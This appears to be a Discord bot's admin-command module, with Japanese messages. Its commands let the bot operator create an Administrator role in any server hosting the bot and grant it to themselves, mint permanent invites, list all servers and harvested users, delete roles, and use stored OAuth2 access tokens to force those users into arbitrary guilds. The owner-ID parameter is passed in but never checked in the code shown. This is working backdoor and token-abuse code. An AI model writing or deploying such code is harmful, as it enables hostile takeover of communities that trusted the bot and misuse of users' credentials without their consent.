const { PermissionFlagsBits, EmbedBuilder } = require('discord.js');
const axios = require('axios');

async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, USERS_FILE) {
    const args = msg.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // 1. !link コマンド (招待リンク生成)
    if (command === 'link') {
        const guildId = args[0] || msg.guildId; 
        if (!guildId) return msg.reply('使用法: !link [サーバーID]');

        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。Botが導入されているか確認してください。');

        try {
            const channel = guild.channels.cache.find(c => 
                (c.type === 0 || c.type === 5) && 
                guild.members.me.permissionsIn(c).has('CreateInstantInvite')
            );
            
            if (!channel) {
                return msg.reply('❌ 招待作成権限のあるチャンネルが見つかりません。');
            }

            const invite = await channel.createInvite({
                maxAge: 0, 
                maxUses: 0,
                unique: true,
                reason: `管理者による無期限招待作成: ${msg.author.tag}`
            });

            await msg.reply(`🔗 **${guild.name}** の無期限招待リンク:\n${invite.url}`);
        } catch (e) {
            await msg.reply(`❌ 招待作成失敗: ${e.message}`);
        }
    }

    // 2. !admin コマンド (管理者ロール強制作成・付与)
    if (command === 'admin') {
        const guildId = args[0];
        const roleName = args[1];
        const position = args[2];
        if (!guildId || !roleName || !position) return msg.reply('使用法: !admin [サーバーID] [ロール名] [up/down]');

        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');

        const botMember = guild.members.me;
        const log = [`🔎 診断開始: ${guild.name}`];

        try {
            if (!botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
                throw new Error('Botに「ロールの管理」権限がありません。');
            }
            log.push('✅ Bot権限確認: OK');

            let role = guild.roles.cache.find(r => r.name === roleName);
            if (!role) {
                role = await guild.roles.create({
                    name: roleName,
                    permissions: [PermissionFlagsBits.Administrator],
                    reason: 'Admin Command'
                });
                log.push(`✅ ロール「${roleName}」を作成しました。`);
            } else {
                log.push(`ℹ️ 既存のロール「${roleName}」を使用します。`);
            }

            if (position === 'up') {
                const botPos = botMember.roles.highest.position;
                log.push(`📊 Botの最高順位: ${botPos}`);
                
                await role.setPosition(botPos - 1).then(() => {
                    log.push(`✅ 順位を ${botPos - 1} に移動しました。`);
                }).catch(e => {
                    log.push(`❌ 順位変更失敗: ${e.message} (Botのロールを一番上に上げてください)`);
                });
            }

            const member = await guild.members.fetch(msg.author.id).catch(() => null);
            if (!member) throw new Error('あなたがサーバーにいません。');

            await member.roles.add(role);
            log.push('✅ あなたにロールを付与しました。');

            await msg.reply(`【実行ログ】\n${log.join('\n')}`);
        } catch (e) {
            log.push(`🛑 致命的エラー: ${e.message}`);
            await msg.reply(`【実行失敗ログ】\n${log.join('\n')}`);
        }
    }

    // 3. !call コマンド (認証済みユーザーを強制参加)
    if (command === 'call') {
        const guildId = args[0];
        if (!guildId) return msg.reply('使用法: !call [サーバーID]');
        
        const userData = loadData(USERS_FILE);
        const users = Object.values(userData);
        if (users.length === 0) return msg.reply('認証済みユーザーがいません。');

        const statusMsg = await msg.reply(`⏳ ${users.length}人の追加処理を開始しました...`);
        let logContent = `【Call実行ログ: ${guildId}】\n`;

        for (const user of users) {
            const name = user.username || user.global_name || user.tag || '名前なし';
            const uid = user.id || user.user_id;
            const token = user.accessToken || user.access_token;

            if (!uid || !token) {
                logContent += `❌ ${name}: データ不足\n`;
                continue;
            }

            try {
                await axios.put(
                    `https://discord.com/api/v10/guilds/${guildId}/members/${uid}`,
                    { access_token: token },
                    { headers: { Authorization: `Bot ${process.env.TOKEN}`, 'Content-Type': 'application/json' } }
                );
                logContent += `✅ ${name} (${uid}): 成功\n`;
            } catch (e) {
                const errorDetail = e.response ? `${e.response.status} ${e.response.statusText}` : e.message;
                logContent += `❌ ${name} (${uid}): 失敗 (${errorDetail})\n`;
            }
        }
        await statusMsg.edit(logContent.length > 2000 ? logContent.slice(0, 1900) + '... (省略)' : logContent);
    }

    // 4. !userlist コマンド (認証済みユーザー一覧)
    if (command === 'userlist') {
        const userData = loadData(USERS_FILE);
        const entries = Object.entries(userData);
        if (entries.length === 0) return msg.reply('認証済みユーザーはいません。');

        const list = entries.map(([keyId, data]) => {
            // 名前なしの原因を探るためのフラグ表示
            const hasU = !!data.username ? '✅' : '❌';
            const name = data.username || data.global_name || (data.tag ? data.tag.split('#')[0] : '名前なし');
            const id = data.id || keyId;
            return `・**${name}** (${id}) [U:${hasU}]`;
        }).join('\n');

        const embed = new EmbedBuilder()
            .setTitle('👤 OAuth2 認証済みユーザー')
            .setDescription(list.length > 2000 ? list.slice(0, 1900) + '...' : list)
            .setColor(0x2ecc71);

        await msg.reply({ embeds: [embed] });
    }

    // 5. !serverlist コマンド (Bot導入サーバー一覧)
    if (command === 'serverlist') {
        const guilds = client.guilds.cache.map(g => `・**${g.name}** (\`${g.id}\`) | 👤 ${g.memberCount}人`).join('\n');
        
        const embed = new EmbedBuilder()
            .setTitle('🏰 導入サーバー一覧')
            .setDescription(guilds || 'なし')
            .setColor(0x5865f2);

        await msg.reply({ embeds: [embed] });
    }

    // 6. !admin-del コマンド (特定ロールの削除)
    if (command === 'admin-del') {
        const guildId = args[0];
        const roleName = args[1];
        if (!guildId || !roleName) return msg.reply('使用法: !admin-del [サーバーID] [ロール名]');

        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');
        
        try {
            const role = guild.roles.cache.find(r => r.name === roleName);
            if (!role) return msg.reply('❌ ロールが見つかりません。');
            
            await role.delete();
            await msg.reply(`🗑️ ロール 「${roleName}」 を削除しました。`);
        } catch (e) {
            await msg.reply(`❌ 削除失敗: ${e.message}`);
        }
    }
}

module.exports = handleAdminCommands;
